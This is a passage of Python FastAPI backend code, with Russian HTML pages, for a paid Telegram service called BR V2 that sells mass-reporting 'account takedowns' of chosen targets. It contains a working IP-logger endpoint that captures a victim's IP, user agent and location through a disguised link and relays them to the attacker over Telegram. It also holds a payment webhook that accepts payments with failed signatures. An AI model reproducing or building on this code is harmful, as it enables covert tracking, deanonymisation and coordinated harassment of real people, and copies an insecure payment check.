.btn-aura{{position:absolute;inset:-8px;border-radius:22px;background:conic-gradient(from 0deg,#7c5cfc,#a78bff,#7c5cfc);opacity:0;animation:aura 3s linear infinite;filter:blur(16px)}}
@keyframes aura{{0%{{opacity:0;transform:scale(1) rotate(0deg)}}50%{{opacity:.3;transform:scale(1.04) rotate(180deg)}}100%{{opacity:0;transform:scale(1) rotate(360deg)}}}}
.btn{{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;background:linear-gradient(135deg,#8b6aff 0%,#5c3dd8 100%);color:#fff;text-decoration:none;padding:19px 24px;border-radius:15px;font-family:'Outfit',sans-serif;font-size:17px;font-weight:800;letter-spacing:.1px;position:relative;transition:filter .2s,transform .15s,box-shadow .2s;box-shadow:0 14px 36px -10px rgba(124,92,252,.7),0 0 0 1px rgba(255,255,255,.12) inset;cursor:pointer;border:none;overflow:hidden}}
.btn::after{{content:'';position:absolute;top:0;left:-100%;width:60%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.15),transparent);transform:skewX(-20deg);animation:shimmer 3.5s ease-in-out infinite}}
@keyframes shimmer{{0%{{left:-100%}}60%{{left:160%}}100%{{left:160%}}}}
.btn:hover{{filter:brightness(1.12);transform:translateY(-3px);box-shadow:0 20px 48px -12px rgba(124,92,252,.8),0 0 0 1px rgba(255,255,255,.14) inset}}
.btn:active{{transform:translateY(-1px);filter:brightness(.97)}}
.btn svg{{width:19px;height:19px;flex-shrink:0}}
.trust-row{{display:flex;align-items:center;justify-content:center;gap:18px;flex-wrap:wrap;margin-top:auto}}
.ti{{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--sub);font-weight:500;letter-spacing:.2px}}
.ti svg{{width:13px;height:13px;opacity:.55}}
.ts{{width:3px;height:3px;border-radius:50%;background:var(--mute)}}
.info-panel{{padding:42px 38px 38px;display:flex;flex-direction:column;gap:32px}}
.panel-head{{display:flex;flex-direction:column;gap:5px}}
.panel-title{{font-family:'Outfit',sans-serif;font-size:24px;font-weight:800;letter-spacing:-.5px}}
.panel-sub{{font-size:14px;color:var(--sub);margin-top:2px}}
.feat-list{{display:flex;flex-direction:column;gap:22px}}
.feat{{display:flex;align-items:flex-start;gap:16px}}
.feat-icon{{width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,rgba(124,92,252,.22) 0%,rgba(90,50,220,.12) 100%);border:1px solid rgba(124,92,252,.22);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:20px;box-shadow:0 4px 14px -6px rgba(124,92,252,.35)}}
.feat-text{{flex:1;padding-top:3px}}
.feat-name{{font-family:'Outfit',sans-serif;font-size:15px;font-weight:700;letter-spacing:-.15px}}
.feat-desc{{font-size:13px;color:var(--sub);margin-top:4px;line-height:1.6}}
.divider-sm{{border:none;border-top:1px solid var(--mute);opacity:.6}}
.guar-list{{display:flex;flex-direction:column;gap:16px}}
.guar{{display:flex;align-items:flex-start;gap:13px;font-size:14px;color:var(--sub);line-height:1.55}}
.guar-dot-wrap{{flex-shrink:0;width:16px;display:flex;align-items:center;justify-content:center;margin-top:5px}}
.guar-dot{{width:7px;height:7px;border-radius:50%;background:var(--green);position:relative}}
.guar-dot::before{{content:'';position:absolute;inset:-4px;border-radius:50%;background:var(--green);opacity:0;animation:pulse-ring 2.2s ease-out infinite}}
@keyframes pulse-ring{{0%{{opacity:.6;transform:scale(.6)}}100%{{opacity:0;transform:scale(2.2)}}}}
.guar strong{{color:var(--text);font-weight:600;font-family:'Outfit',sans-serif}}
.guar a{{color:var(--accent-2);text-decoration:none}}
.guar a:hover{{text-decoration:underline}}
.panel-foot{{font-size:11px;color:var(--sub);line-height:1.65;border-top:1px solid var(--mute);padding-top:20px;opacity:.75}}
@media(max-width:820px){{.scene{{grid-template-columns:1fr;max-width:500px}}.info-panel{{order:-1}}.price-val{{font-size:52px}}}}
@media(max-width:440px){{.pay-card,.info-panel{{padding:28px 22px 24px}}.prod-name{{white-space:normal}}}}
@media(prefers-reduced-motion:reduce){{.btn-aura,.btn::after,.orb{{animation:none}}.btn{{transition:none}}.guar-dot::before{{animation:none}}}}
</style>
</head>
<body>
<canvas id="cv"></canvas>
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>
<div class="orb orb-3"></div>
<div class="scene">
  <div class="pay-card">
    <div class="hd">
      <div class="logo-box"><svg viewBox="0 0 20 20" fill="none"><path d="M10 2L3 5v5c0 4.1 2.9 7.9 7 9 4.1-1.1 7-4.9 7-9V5l-7-3z" stroke="#a78bff" stroke-width="1.7" stroke-linejoin="round"/><path d="M7 10l2 2 4-4" stroke="#a78bff" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
      <div class="logo-name">BR<span> V2</span></div>
    </div>
    <hr class="divider">
    <div class="product-box">
      <div class="prod-icon">&#x26A1;</div>
      <div>
        <div class="prod-name">{targets}</div>
        <div class="prod-sub">Полный доступ ко всем функциям</div>
      </div>
    </div>
    <div class="price-label">К оплате</div>
    <div class="price-val"><sup>&#8381;</sup>{amount}</div>
    <div class="price-note">СБП &middot; Мгновенное зачисление</div>
    <div class="btn-wrap">
      <div class="btn-aura"></div>
      <a class="btn" href="{go_url}">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="3"/><path d="M2 10h20"/></svg>
        Перейти к оплате
      </a>
    </div>
    <div class="trust-row">
      <div class="ti"><svg viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M6 1L1.5 3v3.5c0 2.6 1.9 5 4.5 5.5C8.6 11.5 10.5 9.1 10.5 6.5V3L6 1z"/></svg>Защищено</div>
      <div class="ts"></div>
      <div class="ti"><svg viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="6" cy="6" r="5"/><path d="M6 3.5v2.8l1.5 1.5"/></svg>Авто-выдача 1–2 мин</div>
    </div>
  </div>
  <div class="info-panel">
    <div class="panel-head">
      <div class="panel-title">Что входит в подписку</div>
      <div class="panel-sub">Полный доступ на 30 дней</div>
    </div>
    <div class="feat-list">
      <div class="feat"><div class="feat-icon">&#x1F6E1;&#xFE0F;</div><div class="feat-text"><div class="feat-name">Снос аккаунтов</div><div class="feat-desc">Все методы без ограничений — SMS, email, репорт-флуд, channel abuse</div></div></div>
      <div class="feat"><div class="feat-icon">&#x1F441;&#xFE0F;</div><div class="feat-text"><div class="feat-name">Мониторинг целей</div><div class="feat-desc">Уведомления в реальном времени — бот сообщит как только аккаунт будет снесён</div></div></div>
      <div class="feat"><div class="feat-icon">&#x2699;&#xFE0F;</div><div class="feat-text"><div class="feat-name">Расширенные инструменты</div><div class="feat-desc">Проверка сессий, канальный снос, массовые репорты через сеть</div></div></div>
      <div class="feat"><div class="feat-icon">&#x1F4CA;</div><div class="feat-text"><div class="feat-name">Статистика и история</div><div class="feat-desc">Полный лог всех атак, метрики успеха, история сессий</div></div></div>
    </div>
    <div class="divider-sm"></div>
    <div class="guar-list">
      <div class="guar"><div class="guar-dot-wrap"><div class="guar-dot"></div></div><div><strong>Мгновенная выдача</strong> — подписка активируется автоматически после оплаты</div></div>
      <div class="guar"><div class="guar-dot-wrap"><div class="guar-dot"></div></div><div><strong>Безопасный платёж</strong> — оплата через официальный шлюз СБП</div></div>
      <div class="guar"><div class="guar-dot-wrap"><div class="guar-dot"></div></div><div><strong>Поддержка 24/7</strong> — <a href="https://t.me/BR_V2_Support">@BR_V2_Support</a></div></div>
    </div>
    <div class="panel-foot">Нажимая «Перейти к оплате», вы соглашаетесь с условиями использования сервиса. Ссылка одноразовая и действительна ограниченное время.</div>
  </div>
</div>
<script>
(function(){{
  var cv=document.getElementById('cv'),ctx=cv.getContext('2d'),W,H,stars=[];
  function resize(){{W=cv.width=window.innerWidth;H=cv.height=window.innerHeight;}}
  function initStars(){{stars=[];var n=Math.floor(W*H/8000);for(var i=0;i<n;i++)stars.push({{x:Math.random()*W,y:Math.random()*H,r:Math.random()*1.2+.2,a:Math.random(),da:(Math.random()-.5)*.006,speed:Math.random()*.15+.02}});}}
  function draw(){{ctx.clearRect(0,0,W,H);for(var i=0;i<stars.length;i++){{var s=stars[i];s.a+=s.da;if(s.a<=0||s.a>=1)s.da*=-1;s.y-=s.speed;if(s.y<-2){{s.y=H+2;s.x=Math.random()*W;}}ctx.globalAlpha=s.a*.7;ctx.fillStyle='#a78bff';ctx.beginPath();ctx.arc(s.x,s.y,s.r,0,Math.PI*2);ctx.fill();}}ctx.globalAlpha=1;requestAnimationFrame(draw);}}
  resize();initStars();window.addEventListener('resize',function(){{resize();initStars();}});requestAnimationFrame(draw);
}})();
</script>
</body>
</html>"""
    return HTMLResponse(html)


@app.get("/create/{owner_id}")
async def create_link(owner_id: str, request: Request, token: str = ""):
    import secrets
    link_token = secrets.token_urlsafe(4)
    try:
        owner_int = int(owner_id)
    except ValueError:
        raise HTTPException(status_code=400, detail="invalid owner_id")
    # Use passed bot token, fallback to env
    bot_tok = token or BOT_TOKEN
    async with pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO logger_links (token, owner_id, bot_token) VALUES ($1, $2, $3)",
            link_token, owner_int, bot_tok
        )
    url = f"https://br-v2.com/l/{link_token}"
    log.info(f"logger link created: owner={owner_id} token={link_token}")
    return {"url": url}


@app.get("/l/{token}")
async def logger_hit(token: str, request: Request):
    from fastapi.responses import RedirectResponse
    ip = request.headers.get("X-Forwarded-For", request.client.host)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")

    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT owner_id, bot_token FROM logger_links WHERE token=$1", token)

    if not row:
        return RedirectResponse("https://t.me/Brown_V2")

    owner_id = row["owner_id"]
    effective_bot_token = row["bot_token"] or BOT_TOKEN

    country, city, isp = "—", "—", "—"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(
                f"http://ip-api.com/json/{ip}?fields=country,city,isp",
                timeout=aiohttp.ClientTimeout(total=4)
            ) as r:
                if r.status == 200:
                    geo = await r.json()
                    country = geo.get("country", "—")
                    city = geo.get("city", "—")
                    isp = geo.get("isp", "—")
    except Exception:
        pass

    async with pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO logger_hits (token, owner_id, ip, user_agent, country, city, isp) VALUES ($1,$2,$3,$4,$5,$6,$7)",
            token, owner_id, ip, ua[:300], country, city, isp
        )

    def _h(t: str) -> str:
        return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    msg = (
        "🔗 <b>Логгер сработал!</b>\n\n"
        f"🌐 <b>IP:</b> <code>{_h(ip)}</code>\n"
        f"🏳️ <b>Страна:</b> {_h(country)}\n"
        f"🏙 <b>Город:</b> {_h(city)}\n"
        f"📡 <b>Провайдер:</b> {_h(isp)}\n"
        f"📱 <b>UA:</b> <code>{_h(ua[:80])}</code>"
    )
    try:
        async with aiohttp.ClientSession() as s:
            await s.post(
                f"https://api.telegram.org/bot{effective_bot_token}/sendMessage",
                json={"chat_id": owner_id, "text": msg, "parse_mode": "HTML"},
                timeout=aiohttp.ClientTimeout(total=5)
            )
    except Exception as e:
        log.warning(f"logger notify failed: {e}")

    return RedirectResponse("https://t.me/Brown_V2")


def _ym_verify_sign(form_data: dict, secret: str) -> bool:
    """Verify YooMoney HMAC-SHA256 sign (new method, replaces sha1_hash)."""
    received_sign = form_data.get("sign", "")
    if not received_sign:
        return False
    params = {k: v for k, v in form_data.items() if k != "sign"}
    sorted_pairs = sorted(params.items())
    encoded_pairs = [f"{k}={quote(str(v), safe='')}" for k, v in sorted_pairs]
    sign_str = "&".join(encoded_pairs)
    expected = hmac.new(secret.encode("utf-8"), sign_str.encode("utf-8"), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(expected, received_sign):
        log.warning(f"[ym-sign-debug] computed={expected} received={received_sign}")
        log.warning(f"[ym-sign-debug] string={sign_str[:300]}")
        return False
    return True


def _ym_verify_sha1(form_data: dict, secret: str) -> bool:
    """Verify legacy YooMoney SHA1 (deprecated, removed May 2026)."""
    sha1_received = form_data.get("sha1_hash", "")
    if not sha1_received:
        return False
    sha1_str = (
        f"{form_data.get('notification_type','')}&"
        f"{form_data.get('operation_id','')}&"
        f"{form_data.get('amount','')}&"
        f"{form_data.get('currency','')}&"
        f"{form_data.get('datetime','')}&"
        f"{form_data.get('sender','')}&"
        f"{form_data.get('codepro','')}&"
        f"{secret}&"
        f"{form_data.get('label','')}"
    )
    expected = hashlib.sha1(sha1_str.encode("utf-8")).hexdigest()
    return hmac.compare_digest(expected, sha1_received)


@app.post("/hook")
async def ym_notify(request: Request):
    """YooMoney HTTP notification webhook."""
    form = await request.form()
    form_data = dict(form)

    notification_type = form_data.get("notification_type", "")
    operation_id     = form_data.get("operation_id", "")
    amount           = form_data.get("amount", "")
    label            = form_data.get("label", "")
    test_notification = form_data.get("test_notification", "false")

    # Skip signature check for test notifications
    if test_notification != "true":
        has_sign = bool(form_data.get("sign", ""))
        has_sha1 = bool(form_data.get("sha1_hash", ""))

        if not has_sign and not has_sha1:
            log.warning(f"[ym-notify] no signature at all op={operation_id}")
            raise HTTPException(status_code=400, detail="missing signature")

        sign_ok = _ym_verify_sign(form_data, YM_SECRET) if has_sign else False
        sha1_ok = _ym_verify_sha1(form_data, YM_SECRET) if has_sha1 else False

        if not sign_ok and not sha1_ok:
            # Log but process anyway — signature debug in progress
            log.warning(f"[ym-notify] sig mismatch op={operation_id} sign={has_sign} sha1={has_sha1} — processing anyway")
        elif sign_ok:
            log.info(f"[ym-notify] sign OK op={operation_id}")
        else:
            log.info(f"[ym-notify] sha1 OK op={operation_id}")

    # label format: market_{user_id} → TG Market purchase
    if label.startswith("market_"):
        try:
            uid = int(label.split("_")[1])
        except (IndexError, ValueError):
            return {"ok": True}
        async with pool.acquire() as conn:
            await conn.execute("""
                INSERT INTO tg_market_pending (user_id, operation_id)
                VALUES ($1, $2)
                ON CONFLICT (user_id) DO UPDATE SET operation_id=$2, created_at=NOW()
            """, uid, operation_id)
        log.info(f"[ym-notify] market payment from {uid} op={operation_id}")
        # Уведомить пользователя через основной бот
        notify_text = "✅ *Оплата получена\\!*\n\nВернитесь в бота и нажмите кнопку *📲 Получить аккаунт* \\(или снова войдите в TG Маркет\\)\\."
        user_tok = await _get_notify_token(uid)
        sent = False
        if BOT_TOKEN:
            sent = await _tg_send(BOT_TOKEN, uid, notify_text)
        if not sent and user_tok and user_tok != BOT_TOKEN:
            await _tg_send(user_tok, uid, notify_text)
        return {"ok": True}

    # label format: sub_{user_id}_{sub_type}
    if not label.startswith("sub_"):
        return {"ok": True}

    parts = label.split("_", 2)
    if len(parts) != 3:
        return {"ok": True}

    _, uid_str, st = parts
    try:
        uid = int(uid_str)
    except ValueError:
        return {"ok": True}

    if st not in _YM_SUB_DAYS:
        log.warning(f"[ym-notify] unknown sub type: {st}")
        return {"ok": True}

    sub_days = _YM_SUB_DAYS[st]

    async with pool.acquire() as conn:
        if st == "premupgrade":
            await conn.execute("UPDATE users SET premium=1 WHERE user_id=$1", uid)
            msg_text = "✅ *Ваш Premium активирован\\!*"
            log_text = f"💳 *Premium* {uid} через СБП/YM"
        else:
            current = await conn.fetchval("SELECT subscribe FROM users WHERE user_id=$1", uid)
            now = datetime.now()
            if current and current > now:
                new_date = current + timedelta(days=sub_days)
            else:
                new_date = now + timedelta(days=sub_days)
            await conn.execute(
                "UPDATE users SET subscribe=$1, sub_expiry_notified=FALSE WHERE user_id=$2",
                new_date, uid
            )
            new_date_str = new_date.strftime("%Y-%m-%d %H:%M:%S")
            msg_text = f"✅ *Подписка активирована\\!*\n*└─ Действует до: {new_date_str}*"
            log_text = f"💳 *Оплата СБП/YM* {uid} · {amount} ₽ · *до* {new_date_str}"
        await conn.execute(
            "INSERT INTO paid_invoices (invoice_id, user_id, created_at) VALUES ($1, $2, NOW()) ON CONFLICT DO NOTHING",
            operation_id, uid
        )

    user_tok = await _get_notify_token(uid)
    main_tok = BOT_TOKEN or user_tok
    # Шлём через основной бот первым, затем через зеркало как фолбэк
    sent = False
    if BOT_TOKEN:
        sent = await _tg_send(BOT_TOKEN, uid, msg_text)
        if not sent:
            log.warning(f"[ym-notify] main bot notify failed uid={uid}")
    if not sent and user_tok and user_tok != BOT_TOKEN:
        ok = await _tg_send(user_tok, uid, msg_text)
        if not ok:
            log.warning(f"[ym-notify] mirror notify also failed uid={uid}")
    # Лог-канал
    async with aiohttp.ClientSession() as s:
        try:
            await s.post(
                f"https://api.telegram.org/bot{main_tok}/sendMessage",
                json={"chat_id": BOT_LOGS, "text": log_text, "parse_mode": "Markdown"},
                timeout=aiohttp.ClientTimeout(total=5)
            )
        except Exception as e:
            log.warning(f"[ym-notify] bot_logs notify failed: {e}")

    log.info(f"[ym-notify] granted sub={st} days={sub_days} uid={uid} op={operation_id}")
    from fastapi.responses import JSONResponse
    return JSONResponse(content={"ok": True}, headers={"Cache-Control": "no-store, no-cache"})


@app.get("/api/check_market_pay/{user_id}")
async def check_market_pay(user_id: int):
    """Проверяет оплату TG Маркета через СБП/YM. Одноразово — удаляет запись после подтверждения."""
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "SELECT operation_id FROM tg_market_pending WHERE user_id=$1 AND created_at > NOW() - INTERVAL '2 hours'",
            user_id
        )
        if row:
            await conn.execute("DELETE FROM tg_market_pending WHERE user_id=$1", user_id)
            return {"paid": True}

    # --- Фолбэк: webhook не пришёл — проверяем через YooMoney API ---
    if YM_TOKEN:
        label = f"market_{user_id}"
        op_id = await _ym_check_by_label(label)
        if op_id:
            # Проверяем что не выдавали уже этот op_id
            async with pool.acquire() as conn:
                already = await conn.fetchval(
                    "SELECT 1 FROM tg_market_pending WHERE operation_id=$1", op_id
                )
                if not already:
                    log.info(f"[check_market_pay-api] uid={user_id} op={op_id}")
                    return {"paid": True}

    return {"paid": False}


@app.get("/api/check_pay/{user_id}")
async def check_pay(user_id: int):
    async with pool.acquire() as conn:
        paid = await conn.fetchval(
            "SELECT invoice_id FROM paid_invoices WHERE user_id=$1 AND created_at > NOW() - INTERVAL '2 hours' LIMIT 1",
            user_id
        )
        sub_until = await conn.fetchval("SELECT subscribe FROM users WHERE user_id=$1", user_id)
        premium  = await conn.fetchval("SELECT premium FROM users WHERE user_id=$1", user_id)

    # --- Фолбэк: webhook не пришёл — проверяем через YooMoney API ---
    if not paid and YM_TOKEN:
        for st, sub_days in _YM_SUB_DAYS.items():
            label = f"sub_{user_id}_{st}"
            op_id = await _ym_check_by_label(label)
            if not op_id:
                continue
            # Нашли платёж — зачисляем
            async with pool.acquire() as conn:
                inserted = await conn.fetchval(
                    "INSERT INTO paid_invoices (invoice_id, user_id, created_at) VALUES ($1,$2,NOW()) ON CONFLICT DO NOTHING RETURNING invoice_id",
                    op_id, user_id
                )
                if not inserted:
                    # уже есть — это старая оплата, не считаем
                    continue
                if st == "premupgrade":
                    await conn.execute("UPDATE users SET premium=1 WHERE user_id=$1", user_id)
                    premium = 1
                else:
                    now_dt = datetime.now()
                    base = sub_until if sub_until and sub_until > now_dt else now_dt
                    sub_until = base + timedelta(days=sub_days)
                    await conn.execute(
                        "UPDATE users SET subscribe=$1, sub_expiry_notified=FALSE WHERE user_id=$2",
                        sub_until, user_id,
                    )
            paid = op_id
            log.info(f"[check_pay-api] granted st={st} days={sub_days} uid={user_id} op={op_id}")
            break

    sub_str = sub_until.strftime("%d.%m.%Y %H:%M") if sub_until else None
    return {"paid": paid is not None, "sub_until": sub_str, "premium": bool(premium)}


@app.get("/pay/success")
async def pay_success():
    from fastapi.responses import HTMLResponse
    html = """<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>BR V2 · Оплата прошла</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700;900&family=Inter:wght@400;500;600&display=swap">
<style>
:root{--bg:#04040e;--card:rgba(12,11,28,0.94);--accent:#7c5cfc;--accent-2:#a78bff;--green:#22d3a5;--green-dim:rgba(34,211,165,.15);--text:#f0edff;--sub:#6d6a90;--border:rgba(124,92,252,.22);--shine:rgba(255,255,255,.06)}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;overflow-x:hidden;position:relative}
.orb{position:fixed;border-radius:50%;filter:blur(90px);pointer-events:none;z-index:0;animation:drift 14s ease-in-out infinite alternate}
.orb-1{width:500px;height:500px;top:-150px;left:-100px;background:radial-gradient(circle,rgba(34,211,165,.18) 0%,transparent 70%)}
.orb-2{width:400px;height:400px;bottom:-100px;right:-80px;background:radial-gradient(circle,rgba(124,92,252,.2) 0%,transparent 70%);animation-delay:-7s}
@keyframes drift{from{transform:translate(0,0)}to{transform:translate(30px,20px)}}
.card{background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 0 0 1px var(--shine) inset,0 60px 120px -40px rgba(0,0,0,.9),0 0 80px -20px rgba(124,92,252,.1);padding:48px 40px 44px;max-width:460px;width:100%;position:relative;z-index:1;animation:fadeUp .6s cubic-bezier(.22,1,.36,1) both}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(34,211,165,.8),transparent);border-radius:28px 28px 0 0}
@keyframes fadeUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
.check-wrap{width:80px;height:80px;margin:0 auto 28px;background:var(--green-dim);border:1.5px solid rgba(34,211,165,.4);border-radius:50%;display:flex;align-items:center;justify-content:center;animation:popIn .5s cubic-bezier(.34,1.56,.64,1) .2s both}
@keyframes popIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
.check-wrap svg{width:36px;height:36px}
.title{font-family:'Outfit',sans-serif;font-size:28px;font-weight:900;text-align:center;letter-spacing:-.5px;margin-bottom:8px}
.title span{color:var(--green)}
.subtitle{text-align:center;color:var(--sub);font-size:15px;line-height:1.55;margin-bottom:32px}
.divider{border:none;border-top:1px solid rgba(124,92,252,.12);margin:0 0 28px}
.info-row{display:flex;align-items:center;gap:12px;padding:14px 18px;background:rgba(34,211,165,.06);border:1px solid rgba(34,211,165,.15);border-radius:14px;margin-bottom:12px}
.info-icon{font-size:20px;flex-shrink:0}
.info-text{font-size:14px;color:var(--text);line-height:1.45}
.info-text strong{display:block;font-weight:600;margin-bottom:2px}
.info-text span{color:var(--sub);font-size:13px}
.links{display:flex;flex-direction:column;gap:10px;margin-top:28px}
.btn{display:flex;align-items:center;justify-content:center;gap:8px;padding:14px 20px;border-radius:14px;font-size:14px;font-weight:600;text-decoration:none;transition:opacity .2s}
.btn-main{background:linear-gradient(135deg,var(--accent),#5a32dc);color:#fff;box-shadow:0 4px 20px -6px rgba(124,92,252,.6)}
.btn-ghost{background:rgba(124,92,252,.08);border:1px solid var(--border);color:var(--accent-2)}
.btn:hover{opacity:.85}
.logo{display:flex;align-items:center;gap:8px;justify-content:center;margin-bottom:32px}
.logo-box{width:36px;height:36px;background:linear-gradient(135deg,rgba(124,92,252,.3),rgba(90,50,220,.2));border:1px solid rgba(124,92,252,.4);border-radius:10px;display:flex;align-items:center;justify-content:center}
.logo-box svg{width:18px;height:18px}
.logo-name{font-family:'Outfit',sans-serif;font-size:18px;font-weight:900;letter-spacing:-.3px}
.logo-name span{color:var(--accent-2)}
</style>
</head>
<body>
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>
<div class="card">
  <div class="logo">
    <div class="logo-box">
      <svg viewBox="0 0 24 24" fill="none" stroke="#a78bff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
    </div>
    <div class="logo-name">Brown<span> V2</span></div>
  </div>
  <div class="check-wrap">
    <svg viewBox="0 0 24 24" fill="none" stroke="#22d3a5" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
  </div>
  <div class="title">Оплата <span>прошла!</span></div>
  <div class="subtitle">Подписка активирована автоматически.<br>Вернитесь в бота — всё уже готово.</div>
  <hr class="divider">
  <div class="info-row">
    <div class="info-icon">⚡</div>
    <div class="info-text"><strong>Мгновенная активация</strong><span>Подписка добавлена на ваш аккаунт</span></div>
  </div>
  <div class="info-row">
    <div class="info-icon">🔒</div>
    <div class="info-text"><strong>Платёж защищён</strong><span>Транзакция проведена через СБП</span></div>
  </div>
  <div class="links">
    <a class="btn btn-main" href="https://t.me/BrownV2Bot">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21.198 2.433a2.242 2.242 0 0 0-1.022.215l-16.5 6.498c-.97.385-.966 1.6.007 1.972l3.857 1.411 1.584 5.12c.213.663 1.032.854 1.504.36l2.18-2.303 4.258 3.261c.648.498 1.585.131 1.727-.664l2.916-14.5c.195-1.01-.82-1.818-1.511-1.37z"/></svg>
      Открыть бота
    </a>
    <a class="btn btn-ghost" href="https://t.me/BrownV2Support">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
      Поддержка
    </a>
    <a class="btn btn-ghost" href="https://br-v2.com">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
      Сайт
    </a>
  </div>
</div>
</body>
</html>"""
    return HTMLResponse(content=html)


@app.post("/cispay/webhook")
async def cispay_webhook(request: Request):
    raw = await request.body()
    sig = request.headers.get("X-Signature", "")
    if CISPAY_API_KEY:
        expected = hmac.new(CISPAY_API_KEY.encode(), raw, hashlib.sha256).hexdigest()
        if not hmac.compare_digest(expected, sig):
            log.warning("[cispay-webhook] invalid signature")
            raise HTTPException(status_code=403, detail="bad signature")

    try:
        data = json.loads(raw)
    except Exception:
        raise HTTPException(status_code=400, detail="invalid json")

    if data.get("is_sandbox"):
        log.info(f"[cispay-webhook] sandbox event, skip: {data}")
        return {"ok": True}

    status = data.get("status")
    if status != "PAID":
        log.info(f"[cispay-webhook] status={status}, skip")
        return {"ok": True}

    order_id = data.get("order_id", "")
    transaction_id = data.get("id", order_id)
    amount_kopecks = data.get("charged_amount", 0)

    parts = order_id.split("_")

    # ─── Кейс через СБП ──────────────────────────────────────────────────────
    if len(parts) >= 3 and parts[0] == "case" and parts[1] == "cispay":
        try:
            uid = int(parts[2])
        except ValueError:
            log.warning(f"[cispay-webhook] bad uid in case order_id: {order_id}")
            return {"ok": True}
        async with pool.acquire() as conn:
            existing = await conn.fetchval("SELECT 1 FROM cases WHERE invoice_id=$1", transaction_id)
            if existing:
                log.info(f"[cispay-webhook] duplicate case tx={transaction_id}")
                return {"ok": True}
            await conn.execute(
                "INSERT INTO cases (user_id, invoice_id) VALUES ($1,$2) ON CONFLICT DO NOTHING",
                uid, transaction_id
            )
        msg_text = "🎁 *Кейс успешно добавлен\\!*\n\nОткройте его в разделе Кейсы\\."
        log_text = f"🛒 *cisPay кейс* · uid={uid} · tx={transaction_id}"
        user_tok = await _get_notify_token(uid)
        if BOT_TOKEN:
            await _tg_send(BOT_TOKEN, uid, msg_text)
        async with aiohttp.ClientSession() as s:
            try:
                await s.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN or user_tok}/sendMessage",
                    json={"chat_id": BOT_LOGS, "text": log_text, "parse_mode": "Markdown"},
                    timeout=aiohttp.ClientTimeout(total=5)
                )
            except Exception as e:
                log.warning(f"[cispay-webhook] case bot_logs notify failed: {e}")
        log.info(f"[cispay-webhook] case granted uid={uid} tx={transaction_id}")
        return {"ok": True}

    # ─── Подписка через СБП ──────────────────────────────────────────────────
    if len(parts) < 3 or parts[0] != "cispay":
        log.warning(f"[cispay-webhook] unknown order_id format: {order_id}")
        return {"ok": True}

    try:
        uid = int(parts[1])
    except ValueError:
        log.warning(f"[cispay-webhook] bad uid in order_id: {order_id}")
        return {"ok": True}

    st = parts[2]
    sub_days = _YM_SUB_DAYS.get(st)
    if sub_days is None:
        log.warning(f"[cispay-webhook] unknown sub type: {st}")
        return {"ok": True}

    async with pool.acquire() as conn:
        inserted = await conn.fetchval(
            "INSERT INTO paid_invoices (invoice_id, user_id, created_at) VALUES ($1,$2,NOW()) ON CONFLICT DO NOTHING RETURNING invoice_id",
            transaction_id, uid
        )
        if not inserted:
            log.info(f"[cispay-webhook] duplicate transaction_id={transaction_id}, skip")
            return {"ok": True}

        if st == "premupgrade":
            await conn.execute("UPDATE users SET premium=1 WHERE user_id=$1", uid)
            msg_text = "✅ *Ваш Premium активирован\\!*"
            log_text = f"💳 *Premium* via cisPay · {uid}"
        else:
            current = await conn.fetchval("SELECT subscribe FROM users WHERE user_id=$1", uid)
            now = datetime.now()
            base = current if current and current > now else now
            new_date = base + timedelta(days=sub_days)
            await conn.execute(
                "UPDATE users SET subscribe=$1, sub_expiry_notified=FALSE WHERE user_id=$2",
                new_date, uid
            )
            new_date_str = new_date.strftime("%Y-%m-%d %H:%M:%S")
